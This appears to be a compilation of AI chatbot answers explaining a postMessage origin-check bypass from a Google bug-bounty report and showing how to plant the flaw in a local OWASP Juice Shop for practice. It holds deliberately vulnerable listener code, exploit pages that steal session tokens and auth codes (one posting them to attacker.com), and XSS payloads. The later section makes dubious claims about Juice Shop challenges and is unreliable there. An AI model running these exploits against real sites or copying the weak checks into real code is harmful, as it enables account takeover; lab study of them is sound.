# postMessage targetOrigin bypass

https://bughunters.google.com/reports/vrp/wG2bN8vZr

gemini - This Google Vulnerability Reward Program (VRP) report, submitted by a researcher, describes a security flaw in the login process for **Google Gemini CodeAssist**. It was serious enough that Google rewarded him with **$20,000**.

### ELI5: The "Fake Address" Trick

Imagine you have a secret note (a login key) that you want to send to your friend at "Google High School."

To make sure the note doesn't go to a bad guy, the school has a security guard who checks the address on the envelope. The guard has one simple rule: **"I will only deliver this note if the address ends with `.google.com`."**

The researcher found a clever way to trick the guard:

1. **The Trick:** He wrote a fake address on the envelope: `https://bad-guy-site.com/hello.google.com`.
2. **The Guard’s Mistake:** The guard looked at the very end of the address, saw `.google.com`, and said, "Looks good to me!"
3. **The Delivery:** But when the delivery truck actually left, it only looked at the *main* part of the address (`bad-guy-site.com`) to decide where to go. It ignored the extra stuff at the end.
4. **The Result:** The guard accidentally handed your secret login key directly to the bad guy!

### What actually happened (The Technical Part)

The vulnerability involved a `postMessage targetOrigin bypass`.

* **The Vulnerable Code:** When you log into Gemini CodeAssist, the website sends your "Authorization Code" (the key to your account) back to the main app using a browser feature called `postMessage`. It checked the destination using a simple rule: `origin.endsWith(".google.com")`.
* **The Exploit:** the attacker realized that he could provide a "destination" string that looked like a URL path (e.g., `https://attacker.com/something.google.com`). Because this string ends with `.google.com`, the security check passed.
* **The Impact:** However, browsers ignore the "path" part of a URL when sending these messages and only look at the domain (`attacker.com`). This allowed an attacker to trick Google into sending a user's private login credentials to a server they controlled, leading to a full **account takeover**.

Google has since fixed this by using much stricter checks to ensure messages only go to verified, official Google domains.

---

*prompt* if i wanted to investigate such vulnerabilities, what would the methodology or process be? also outline possible resources, tools i can use.

Investigating `postMessage` vulnerabilities (like the one attacker found) requires a mix of static code analysis and dynamic testing.

Here is the professional methodology and the toolkit you'll need.

---

## 1. Methodology: The Hunt Process

### Phase 1: Recon & Discovery

The goal is to find where the application is "talking" to other windows or frames.

* **Keyword Search:** Grep through gathered JavaScript files for keywords like `.postMessage(`, `window.addEventListener("message"`, or `.on("message"`.

* **Live Monitoring:** Navigate the site while watching for cross-window communication. Look for features like third-party logins (OAuth), embedded widgets (chat, payments), or multi-domain dashboards.

### Phase 2: Identifying the Listener

Once you find a `message` event listener, you need to find the "sink" (where the data ends up).

* **Find the code:** Use Chrome DevTools → **Sources** tab → **Global Listeners** (in the right sidebar) → Expand **message**. This shows you exactly which script is listening.
* **Analyze the Handler:** Look at the function that handles the message. Is it taking `event.data` and putting it into an `eval()`, `innerHTML`, or using it to perform an authenticated action?

### Phase 3: Testing Origin Validation

This is where the Google bug happened. You are looking for **weak logic** in the origin check:

* **The Wildcard:** Is it using `*`? (Any site can send a message).
* **Regex Flaws:** Does it use a regex like `/\.google\.com/` without escaping dots or anchoring the string? (e.g., `attacker-google.com` would pass).
* **Method Flaws:** Does it use `.indexOf()` or `.endsWith()`? As seen in the report, `attacker.com/google.com` can trick `.endsWith(".google.com")` if the browser interprets the path differently than the code logic.

### Phase 4: Exploitation (PoC)

To prove the bug, you usually need to host a "malicious" page that:

1. Opens the target site in an `iframe` or a `window.open()` popup.
2. Uses `postMessage` to send a payload (for XSS) or sets up a listener to steal a token (for Account Takeover).

---

## 2. Recommended Tools

| Tool | Purpose |
| --- | --- |
| **Burp Suite DOM Invader** | The "gold standard." It's built into Burp's browser and automatically finds `postMessage` sources/sinks and tries to bypass origin checks for you. |
| **MessPostage (Extension)** | A Firefox/Chrome extension that alerts you every time a `postMessage` is sent or a listener is added. Great for passive discovery. |
| **Posta** | A specialized tool for researching cross-document messaging. It allows you to "replay" messages and explore handlers. |
| **PMHook** | A client-side JS library (run via TamperMonkey) that logs all message events and listeners to the console. |

---

## 3. Learning Resources

If you want to practice these techniques in a safe environment, start here:

* **PortSwigger Academy (DOM XSS Labs):** They have specific labs for [controlling the web message source](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source) and bypassing origin filters.
* **PentesterLab:** Check out their "postMessage" exercises for hands-on exploitation scenarios.
* **GitHub Labs:** Search for `postMessage-vulnerability-demo` or `postMessageLab` to find local environments you can break.

*prompt* is it possible to create or add such a vulnerability to a forked owasp juice shop on my computer? if so, how?

Since Juice Shop is built with **Node.js (Express)** on the backend and **Angular** on the frontend, you can introduce a "message listener" that mimics the exact logic flaw attacker found in the Google report.

Here is a guide on how to modify your local Juice Shop to include a vulnerable `postMessage` handler.

---

## 1. Locate the Right File

In your forked Juice Shop directory, you’ll want to add this to a frontend component so you can interact with it via the browser. A good place is the `ContactComponent` or a custom helper script.

**Path:** `frontend/src/app/contact/contact.component.ts` (or similar component)

## 2. Add the Vulnerable Code

Insert a "listener" in the `ngOnInit` function (the code that runs when the page loads). We will intentionally use the **`.endsWith()`** logic that caused the Google vulnerability.

```typescript
// Inside contact.component.ts or a similar frontend file
ngOnInit() {
  window.addEventListener("message", (event) => {
    // VULNERABLE LOGIC: Only checks if the origin ends with a trusted string
    // This can be bypassed with: https://attacker.com/trusted.com
    if (event.origin.endsWith("localhost:3000")) { 
      console.log("Message received from trusted origin:", event.data);
      
      // Sink: Potential XSS if we trust the message content blindly
      const statusElement = document.getElementById("feedback-status");
      if (statusElement) {
        statusElement.innerHTML = "Latest Update: " + event.data.status;
      }
    }
  }, false);
}

```

### Why this is vulnerable:

1. **The Origin Check:** By using `.endsWith("localhost:3000")`, an attacker could host a site at `https://evil-site.com/localhost:3000`. The browser sees the origin as `https://evil-site.com`, but your code only looks at the very end of the string.
2. **The Sink:** It uses `.innerHTML`. If an attacker successfully bypasses the origin check, they can send a message like `{"status": "<img src=x onerror=alert(1)>"}` to execute a Cross-Site Scripting (XSS) attack.

---

## 3. How to Test It (The Exploit)

To test your new vulnerability, you don't even need a second server. You can use a **data URI** or a local HTML file to act as the "attacker."

1. Create a file named `exploit.html` on your desktop:
```html
<html>
  <body>
    <script>
      // Open the local Juice Shop
      const target = window.open("http://localhost:3000/#/contact");

      // Wait for it to load, then send the malicious message
      setTimeout(() => {
        target.postMessage(
          { status: "<img src=x onerror=alert('Bypassed!')>" }, 
          "*" // Target any origin
        );
      }, 2000);
    </script>
  </body>
</html>

```


2. Open `exploit.html` in your browser. If your code modification worked, you should see an alert box pop up on your Juice Shop tab.

---

## 4. Helpful Tools for Modification

| Tool | Usage in this Project |
| --- | --- |
| **VS Code / Cursor** | Best for navigating the Juice Shop's large TypeScript codebase. |
| **npm start** | Use this to run your local instance and see changes in real-time. |
| **Chrome DevTools** | Use the **Console** to run `window.postMessage()` manually for quick testing without an exploit file. |

---

*Would you like me to show you how to write a more complex "Account Takeover" version of this vulnerability for your Juice Shop?*

To turn this from a simple "pop-up alert" into a full **Account Takeover (ATO)** vulnerability in your local Juice Shop, we need to change the logic so the listener doesn't just display text, but instead **hands over sensitive information** (like the user's Session Token) to the sender.

In a real-world scenario like the Google report, the application was tricked into sending an Authorization Code *back* to the attacker. We can simulate that here.

---

## 1. Modify the Juice Shop Code

Go back to your component file (e.g., `frontend/src/app/contact/contact.component.ts`) and replace the previous code with this "Data Exfiltration" version:

```typescript
ngOnInit() {
  window.addEventListener("message", (event) => {
    // 1. VULNERABLE ORIGIN CHECK
    // This allows bypasses like: https://attacker.com/localhost:3000
    if (event.origin.endsWith("localhost:3000")) {
      
      // 2. SENSITIVE ACTION
      // If the sender asks for 'handshake', send the browser's storage back to them
      if (event.data.action === "get_session_data") {
        const sessionToken = localStorage.getItem('token'); // This is where the JWT lives
        
        // 3. EXFILTRATION SINK
        // Sending private data to the source of the message!
        event.source.postMessage({
          type: "session_leaked",
          token: sessionToken
        }, event.origin); 
      }
    }
  }, false);
}

```

---

## 2. The Attacker's Exploit (The "Receiver")

Now, create a new HTML file named `ato_exploit.html`. This file acts as the attacker’s site. Its job is to:

1. Open the Juice Shop.
2. Send the `get_session_data` request.
3. Listen for the response and steal the token.

```html
<html>
<body style="background: #f0f0f0; font-family: sans-serif;">
    <h2>Attacker Control Panel</h2>
    <button onclick="startExploit()">Steal Session Token</button>
    <div id="stolen-data" style="color: red; margin-top: 20px;"></div>

    <script>
        function startExploit() {
            // 1. Open the victim's Juice Shop page
            const victimWindow = window.open("http://localhost:3000/#/contact");

            // 2. Setup a listener to catch the stolen token
            window.addEventListener("message", (event) => {
                if (event.data.type === "session_leaked") {
                    document.getElementById('stolen-data').innerText = 
                        "STOLEN JWT: " + event.data.token;
                    console.log("Full Token Looted:", event.data.token);
                }
            });

            // 3. Wait for the page to load, then trigger the leak
            setTimeout(() => {
                victimWindow.postMessage({ action: "get_session_data" }, "*");
            }, 3000);
        }
    </script>
</body>
</html>

```

---

## 3. The Execution (Proof of Concept)

1. **Log in** to your local Juice Shop as any user (so a token exists in `localStorage`).
2. **Open `ato_exploit.html**` in a new tab.
3. **Click the button.**
4. A new window opens to the Contact page. After 3 seconds, the session token is sent from the Juice Shop window back to your Attacker page.

---

## 4. Why this is so dangerous

In this scenario, you have successfully performed an **Account Takeover**.

* The attacker now has the `JWT` (JSON Web Token).
* They can go to their own browser, open the Juice Shop, and paste that token into their own `localStorage`.
* They are now logged in as you, without ever needing your password.

### Key Takeaway for Bug Hunting:

When you find a `postMessage` listener, always check if it responds with data. If a listener says, "If I get X message, I will send back Y data," and the origin check is weak, you have a high-severity information disclosure or ATO bug.

**Would you like me to show you how to fix this code using a "White-list" approach so the vulnerability is properly patched?**


----

claude - This is a classic **postMessage targetOrigin bypass** vulnerability. Let me help you recreate a similar vulnerability in OWASP Juice Shop.

## Understanding the Vulnerability

The core issue is using `String.endsWith()` to validate origins instead of properly parsing the URL. The vulnerable pattern looks like:

```javascript
// VULNERABLE CODE
if (event.origin.endsWith('.google.com')) {
  window.opener.postMessage(authCode, event.origin);
}
```

An attacker can bypass this with: `https://evil.com/fake.google.com`

## Recreating in OWASP Juice Shop

OWASP Juice Shop doesn't have this exact vulnerability by default, but I'll show you how to **add** this vulnerability to your local Juice Shop instance for educational purposes, then exploit it.

### Step 1: Set Up Juice Shop

```bash
git clone https://github.com/juice-shop/juice-shop.git
cd juice-shop
npm install
npm start
```

### Step 2: Add the Vulnerable Code

Create a new file `frontend/src/app/oauth-callback/oauth-callback.component.ts`:

```typescript
import { Component, OnInit } from '@angular/core';
import { ActivatedRoute } from '@angular/router';

@Component({
  selector: 'app-oauth-callback',
  template: `
    <div class="container">
      <h1>Processing OAuth Login...</h1>
      <p>Please wait while we complete your authentication.</p>
    </div>
  `
})
export class OAuthCallbackComponent implements OnInit {
  constructor(private route: ActivatedRoute) {}

  ngOnInit() {
    // Get the authorization code from URL
    this.route.queryParams.subscribe(params => {
      const authCode = params['code'];
      const state = params['state'];
      
      if (authCode && window.opener) {
        // Listen for origin request from opener
        window.addEventListener('message', (event) => {
          // VULNERABLE: Using endsWith to validate origin
          if (event.data.type === 'REQUEST_AUTH_CODE' && 
              event.origin.endsWith('.juice-sh.op')) {
            
            // Send the auth code back
            window.opener.postMessage({
              type: 'AUTH_CODE',
              code: authCode,
              state: state
            }, event.origin); // Using the attacker-controlled origin!
            
            window.close();
          }
        });
        
        // Notify opener that we're ready
        window.opener.postMessage({ type: 'READY' }, '*');
      }
    });
  }
}
```

### Step 3: Create the Exploit

Now create an attacker-controlled page (`attacker.html`) hosted on your own domain:

```html
<!DOCTYPE html>
<html>
<head>
  <title>Innocent Looking Site</title>
</head>
<body>
  <h1>Special Offer - Click to Login!</h1>
  <button onclick="exploit()">Login with Juice Shop</button>
  
  <div id="result"></div>

  <script>
    let popupWindow;
    
    function exploit() {
      // Open the OAuth callback page with fake auth code
      const callbackUrl = 'http://localhost:3000/oauth-callback?code=SECRET_AUTH_CODE_12345&state=abc';
      popupWindow = window.open(callbackUrl, 'oauth', 'width=500,height=600');
      
      // Listen for the READY message
      window.addEventListener('message', (event) => {
        if (event.data.type === 'READY') {
          // Request the auth code with our malicious origin
          // Our domain is https://evil.com/fake.juice-sh.op
          // This ends with .juice-sh.op but is actually evil.com!
          popupWindow.postMessage({
            type: 'REQUEST_AUTH_CODE'
          }, '*');
        }
        
        if (event.data.type === 'AUTH_CODE') {
          // We got the auth code! Account takeover achieved
          document.getElementById('result').innerHTML = 
            '<h2>🎉 Auth Code Stolen!</h2>' +
            '<p>Authorization Code: ' + event.data.code + '</p>' +
            '<p>This can now be used to take over the account!</p>';
          
          // Send to attacker's server
          fetch('https://attacker.com/collect', {
            method: 'POST',
            body: JSON.stringify(event.data)
          });
        }
      });
    }
  </script>
</body>
</html>
```

### Step 4: The Key Bypass Technique

The exploit works because:

1. **Attacker's domain**: `https://evil.com/fake.juice-sh.op`
2. **String check**: `event.origin.endsWith('.juice-sh.op')` ✅ PASSES
3. **Browser reality**: `event.origin` is actually `https://evil.com` (browsers strip the path)
4. **Result**: Message sent to attacker's domain with victim's auth code

## The Fix

The proper way to validate origins:

```javascript
// SECURE CODE
function isValidOrigin(origin) {
  try {
    const url = new URL(origin);
    // Check the actual hostname, not string matching
    return url.hostname === 'juice-sh.op' || 
           url.hostname.endsWith('.juice-sh.op');
  } catch {
    return false;
  }
}

window.addEventListener('message', (event) => {
  if (event.data.type === 'REQUEST_AUTH_CODE' && 
      isValidOrigin(event.origin)) {
    // Safe to send message
    window.opener.postMessage({...}, event.origin);
  }
});
```

## Testing the Exploit

1. Host your `attacker.html` on a domain like `https://yourdomain.com/fake.juice-sh.op`
2. Visit your attacker page
3. Click the "Login" button
4. The popup opens to Juice Shop's OAuth callback
5. Your malicious page receives the authorization code
6. Account takeover complete! 🎯

This demonstrates why proper URL parsing is critical for security checks - never use string operations like `endsWith()` or `startsWith()` for origin validation!


----

deepseek - This is a specific but critical web security vulnerability. Let's break it down.

### The Foundation: `postMessage()` and `targetOrigin`

First, understand the core mechanism:

*   **`postMessage()`:** A safe, browser-provided method for scripts from different origins (domains, protocols, ports) to communicate with each other. It's essential for modern web apps with embedded iframes (e.g., maps, payment widgets, ads) or cross-origin windows.
*   **`targetOrigin`:** A crucial security parameter of `postMessage()`. When Window A sends a message to Window B, `targetOrigin` specifies *which origin Window B must have* for the browser to deliver the message.
    *   **Example:** `iframe.contentWindow.postMessage('secretData', 'https://trusted-app.com');`
    *   **The Browser's Job:** It checks the actual origin of the receiving `iframe` or window. If it's **exactly** `https://trusted-app.com`, the message is delivered. If the iframe is from `https://evil-site.com`, the browser **discards** the message.

### The Vulnerability: Bypassing the `targetOrigin` Check

The vulnerability arises when **the receiving side's message event listener is poorly implemented**, making it effectively ignore the intended `targetOrigin` restriction. The **sending side's `targetOrigin` is not the vulnerable part**; it's just a sender instruction. The vulnerability is on the **receiver's side**.

#### Common Vulnerable Patterns in the Event Listener:

Here’s how the receiving code (`window.addEventListener('message', ...)`) can be flawed:

1.  **Weak Origin Validation Using `indexOf()` or `endsWith()`:**
    ```javascript
    window.addEventListener('message', (event) => {
        // VULNERABLE: https://trusted-app.com.evil.site matches!
        if (event.origin.indexOf('trusted-app.com') !== -1) {
            processData(event.data);
        }
    });
    ```
    *   **Bypass:** An attacker can register a domain like `https://trusted-app.com.evil.site`. The `indexOf()` check passes, and the message is accepted.

2.  **Checking `origin` Against a Regex That Allows Subdomains or Other Paths:**
    ```javascript
    // VULNERABLE: Regex allows any subdomain of trusted-app.com
    if (/https?:\/\/.*\.trusted-app\.com/.test(event.origin)) {
        // ...
    }
    ```
    *   **Bypass:** `https://evil.trusted-app.com` would match.

3.  **Explicitly Allowing the `null` Origin:**
    *   The `origin` property can be `"null"` in two main cases:
        a) Messages sent from `sandboxed` iframes (without `allow-same-origin`).
        b) Messages sent from a `file://` URL.
    *   If the listener explicitly allows `null` for "convenience," it opens a huge hole.
    ```javascript
    // VULNERABLE: Allows null origin
    if (event.origin === 'https://app.com' || event.origin === 'null') {
        // An attacker can host a page in a sandboxed iframe to send messages with origin=null
    }
    ```

4.  **Wildcard Acceptance (`'*'`):**
    ```javascript
    // HIGHLY VULNERABLE: Accepts messages from ANY origin
    window.addEventListener('message', (event) => {
        processData(event.data); // No origin check at all!
    });
    ```
    *   **Bypass:** Trivial. Any site can send messages that will be processed.

5.  **Checking `source` Property Instead of `origin`:**
    *   The `event.source` is a reference to the sending window object, not a string origin. Checking this incorrectly is a flaw.
    *   **Note:** While not a `targetOrigin` bypass per se, it's a related common logic error in postMessage handlers.

### The Attacker's Perspective (Penetration Tester's View)

During a pentest, you would:

1.  **Identify:** Look for uses of `postMessage()` in the target application's JavaScript.
2.  **Analyze the Listener:** Find the `message` event listener. Your goal is to answer: **"Can I make a legitimate message from an attacker-controlled page pass the `event.origin` validation check?"**
3.  **Craft the Exploit:**
    *   If the check is weak (e.g., `indexOf('trusted-domain.com')`), you purchase/use a domain that contains that string.
    *   You create a malicious page on that domain.
    *   On your malicious page, you embed the target application in an `iframe` or open it in a popup.
    *   You use `postMessage()` from your page **to the target window/iframe**, sending a malicious payload (e.g., `{command: "updateEmail", email: "attacker@evil.com"}`).
    *   Because your origin bypasses the flawed validation, the target application accepts and processes your malicious message.

**Impact:** This can lead to a wide range of attacks, often resulting in **Cross-Site Scripting (XSS)** or severe business logic flaws (account takeover, data theft, unauthorized actions) depending on what the message handler does.

### Remediation (For Secure Code)

The fix is **always on the receiving side**:

*   **Use Strict Equality (`===`):** Always check the exact, expected origin.
    ```javascript
    const ALLOWED_ORIGIN = 'https://expected-app.com';
    window.addEventListener('message', (event) => {
        if (event.origin !== ALLOWED_ORIGIN) {
            return; // Reject and do nothing
        }
        // Process the message securely
    });
    ```
*   **Maintain an Allow List:** If multiple origins are needed, maintain an exact list.
*   **Never Allow `null` Origin** unless absolutely required, and understand the severe security implications.
*   **Always Validate the `data`:** Even after origin checks, treat the incoming `event.data` as untrusted input. Validate its structure and content.

### Summary for a Pentester's Report

**Vulnerability:** PostMessage `targetOrigin` Bypass (or Improper PostMessage Origin Validation)
**Risk:** Typically **High** or **Critical**, leading to XSS or client-side logic compromise.
**Root Cause:** The receiving page's message event listener implements weak or insufficient validation of the `event.origin` property, allowing messages from untrusted origins to be processed.
**Proof of Concept (PoC):** Provide a minimal HTML file that, when hosted on a crafted domain, sends a malicious `postMessage` payload that the target application accepts and executes.
**Recommendation:** Implement strict, exact-match validation of the `event.origin` property against a pre-defined allow list of trusted origins.


---

The **OWASP Juice Shop** has several postMessage-related vulnerabilities, including targetOrigin bypass issues. Let me walk you through finding and exploiting them.

## Finding PostMessage Vulnerabilities in Juice Shop

### Step 1: Identify PostMessage Usage

First, let's look for postMessage usage in the Juice Shop application:

1. **Search in Developer Tools:**
   ```javascript
   // In Chrome DevTools Console
   // Search for postMessage usage
   [].map.call(document.querySelectorAll('script'), s=>s.src).filter(Boolean).forEach(src=>{
     fetch(src).then(r=>r.text()).then(text=>{
       if(text.includes('postMessage')) console.log('Found in:', src);
     })
   });
   
   // Or search in current scripts
   var scripts = document.getElementsByTagName('script');
   for(var i=0; i<scripts.length; i++) {
     if(scripts[i].innerHTML.includes('postMessage')) {
       console.log('Found postMessage in inline script');
     }
   }
   ```

2. **Check for message event listeners:**
   ```javascript
   // List all message event listeners
   getEventListeners(window).message?.forEach(listener => {
     console.log('Message listener:', listener);
   });
   ```

### Step 2: Known Juice Shop PostMessage Challenges

Juice Shop has several postMessage-related challenges:

1. **"DOM XSS" Challenge** - Uses postMessage with weak origin validation
2. **"Privacy Policy" Challenge** - Another postMessage vector
3. **"Extra Language" Challenge** - Also involves postMessage

### Step 3: Exploiting a Specific Vulnerability

Let's recreate the **DOM XSS via postMessage** challenge:

#### Vulnerability Location:
The main application (`main.js` or similar) has code like:

```javascript
window.addEventListener('message', function(event) {
  // VULNERABLE: Weak origin check using indexOf()
  if (event.origin.indexOf('juice-shop') > -1) {
    // Process the message - often leads to XSS
    document.getElementById('some-element').innerHTML = event.data;
  }
});
```

#### Exploitation Steps:

**Method 1: Using Browser DevTools**

1. **Navigate to Juice Shop** (typically `http://localhost:3000`)

2. **Open DevTools Console** and send a malicious message:
   ```javascript
   // Simulate a postMessage from a "trusted" origin
   // The app might check for 'juice-shop' in the origin
   window.postMessage('<img src=x onerror=alert("XSS")>', '*');
   
   // Or more specifically
   window.postMessage(
     { 
       type: 'updateContent',
       data: '<script>alert(document.cookie)</script>'
     }, 
     '*'
   );
   ```

**Method 2: Create an Exploit HTML File**

Create `exploit.html`:
```html
<!DOCTYPE html>
<html>
<head>
    <title>Juice Shop PostMessage Exploit</title>
</head>
<body>
    <h2>Juice Shop PostMessage Exploit</h2>
    
    <iframe id="targetFrame" 
            src="http://localhost:3000" 
            width="800" 
            height="600">
    </iframe>
    
    <script>
        // Wait for iframe to load
        setTimeout(() => {
            const iframe = document.getElementById('targetFrame');
            
            // Target the iframe's contentWindow
            const targetWindow = iframe.contentWindow;
            
            // Craft malicious payload
            const maliciousPayload = {
                type: 'changeLanguage',  // Common message type in Juice Shop
                language: 'en',
                // XSS payload
                payload: '<img src=x onerror="alert(`XSS via postMessage`)">'
            };
            
            // Send the message - using * as targetOrigin
            targetWindow.postMessage(maliciousPayload, '*');
            
            console.log('Exploit sent! Check the iframe...');
        }, 3000);
    </script>
</body>
</html>
```

**Method 3: Advanced Exploitation with Origin Spoofing**

If Juice Shop checks for specific origins:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Advanced Exploit</title>
</head>
<body>
    <script>
        // Open Juice Shop in a new window
        const target = window.open('http://localhost:3000', '_blank');
        
        // Wait for it to load
        setTimeout(() => {
            // Send message with carefully crafted origin bypass
            // Juice Shop might check for "localhost" or "juice-shop"
            const exploitData = {
                // Try different payloads
                "notification": "Welcome! <script>alert(1)</script>",
                "message": "<iframe src='javascript:alert(`XSS`)'>",
                "html": "<svg onload=alert('XSS')>"
            };
            
            // Try different targetOrigins
            target.postMessage(exploitData, 'http://localhost:3000');
            target.postMessage(exploitData, 'http://juice-shop.local');
            target.postMessage(exploitData, '*');
            
        }, 2000);
    </script>
</body>
</html>
```

### Step 4: Finding the Actual Vulnerable Code

To understand the exact vulnerability:

1. **Search Juice Shop source code:**
   ```bash
   # Clone Juice Shop if you haven't
   git clone https://github.com/juice-shop/juice-shop.git
   cd juice-shop
   
   # Search for postMessage patterns
   grep -r "postMessage" --include="*.js" --include="*.ts" .
   grep -r "addEventListener.*message" .
   grep -r "event.origin" .
   ```

2. **Common vulnerable patterns in Juice Shop:**
   - Look for `indexOf('localhost')` or `indexOf('juice-shop')` checks
   - Look for `.includes()` checks on event.origin
   - Look for regex checks like `/localhost/`

### Step 5: Using Burp Suite to Intercept

1. **Configure Burp Suite proxy**
2. **Browse Juice Shop**
3. **Look for JavaScript files with postMessage handlers**
4. **Use Burp's "Search" feature** for "postMessage" or "addEventListener"

### Step 6: Practical Exercise - "Extra Language" Challenge

One specific challenge involves changing the language via postMessage:

```javascript
// Exploit code for the language challenge
const iframe = document.createElement('iframe');
iframe.src = 'http://localhost:3000';
document.body.appendChild(iframe);

iframe.onload = () => {
    // The vulnerable code might look for messages like this:
    iframe.contentWindow.postMessage({
        action: 'setLanguage',
        lang: 'klingon',  // The "extra" language
        payload: '<script>alert("XSS")</script>'
    }, '*');
};
```

### Step 7: Automated Discovery Script

Create a browser bookmarklet for testing:

```javascript
javascript:(function(){
    // Test for postMessage handlers
    var oldPostMessage = window.postMessage;
    window.postMessage = function(data, origin) {
        console.log('Intercepted postMessage:', data, origin);
        return oldPostMessage.apply(this, arguments);
    };
    
    // Try to trigger any postMessage handlers
    var testPayloads = [
        {type: 'notification', message: '<img src=x onerror=alert(1)>'},
        {type: 'language', lang: 'klingon'},
        {action: 'update', data: 'test'},
        '<script>alert("test")</script>'
    ];
    
    testPayloads.forEach(payload => {
        window.postMessage(payload, '*');
        window.postMessage(payload, 'http://localhost:3000');
        window.postMessage(payload, 'http://juice-shop.local');
    });
})();
```

## Important Notes for Juice Shop:

1. **Juice Shop versions matter** - Different versions have different vulnerabilities
2. **Check the scoreboard** - Some challenges specifically mention "postMessage"
3. **Use the "Hacking Instructor"** - It might guide you through postMessage exploits
4. **Look at client-side code** - Most postMessage vulnerabilities are in frontend JavaScript

## Detection Tips:

1. **In DevTools Sources tab**, search for "addEventListener('message'"
2. **Look for weak validation patterns**:
   ```javascript
   // Weak patterns to look for:
   if (event.origin.includes('juice-shop'))  // Easy to bypass
   if (event.origin.endsWith('localhost'))   // Can be bypassed
   if (event.origin === 'null')              // Allows sandboxed iframes
   if (!event.origin)                        // Accepts missing origin
   ```

3. **Test with different origins**:
   - `http://localhost:3000.evil.com`
   - `http://juice-shop.local`
   - `null` (from sandboxed iframes)
   - `*` (wildcard)

This should give you a comprehensive approach to finding and exploiting postMessage vulnerabilities in OWASP Juice Shop. Remember to run your tests in a controlled environment and document your findings!
